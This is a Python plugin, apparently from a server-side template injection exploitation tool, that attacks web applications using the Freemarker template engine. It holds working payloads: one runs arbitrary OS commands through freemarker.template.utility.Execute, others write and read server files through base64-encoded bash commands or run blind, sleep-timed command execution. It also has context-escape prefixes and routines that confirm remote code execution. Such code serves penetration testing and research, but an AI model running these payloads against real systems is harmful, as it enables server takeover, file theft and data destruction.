from utils.strings import quote, chunkit, md5
from utils.loggers import log
from utils import rand
from core.plugin import Plugin
from core import languages
import re
import base64

class Freemarker(Plugin):

    actions = {
        'render' : {
            'render': '${%(code)s}',
            'header': '${%(header)s?c}',
            'trailer': '${%(trailer)s?c}'
        },
        'write' : {
            'call' : 'execute',
            'write' : """bash -c {base64,--decode}<<<{tr,/+,_-}<<<%(chunk_b64)s>>%(path)s""",
            'truncate' : """bash -c {echo,-n,}>%(path)s"""
        },
        'read' : {
            'call': 'execute',
            'read' : """bash -c base64<%(path)s"""
        },
        'md5' : {
            'call': 'execute',
            'md5': """bash -c md5<%(path)s"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': '- %(code)s'
        },
        # Prepared to used only for blind detection. Not useful for time-boolean
        # tests (since && characters can\'t be used) but enough for the detection phase.
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c %(code)s&&{sleep,%(delay)s}") }"""
        },
        'execute' : {
            'call': 'render',
            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("%(code)s") }"""
        }

    }


    contexts = [


        # Text context, no closures
        { 'level': 0 },

        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : languages.java_ctx_closures },

        # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
        { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
        { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
        { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s<#--%s-->%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.render(payload):
            self.set('language', 'java')
            self.set('engine', 'freemarker')

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('execute', True)
            # TODO: manage Window environment
            self.set('os', self.execute("uname"))
            self.set('write', True)
            self.set('read', True)

    def detect_blind_engine(self):

        if not self.get('blind'):
            return

        self.set('language', 'java')
        self.set('execute', True)
        self.set('engine', 'freemarker')
